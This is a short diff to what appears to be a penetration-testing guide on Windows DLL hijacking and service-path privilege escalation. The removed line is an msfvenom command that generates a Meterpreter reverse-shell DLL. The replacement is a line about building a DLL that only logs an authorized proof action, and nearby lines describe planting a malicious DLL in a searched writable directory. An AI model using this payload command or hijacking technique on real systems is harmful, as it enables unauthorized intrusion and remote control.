@@ -3,7 +3,7 @@
 ## DLL Hijacking (T1574.001)
 - Use Process Monitor to find missing DLL loads (NAME NOT FOUND) in privileged apps
 - Place malicious DLL in writable directory that's searched before system dirs
-- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f dll > evil.dll`
+- Compile a purpose-built DLL that performs the authorized proof action and logs execution evidence
 
 ## Unquoted Service Paths
 ```cmd
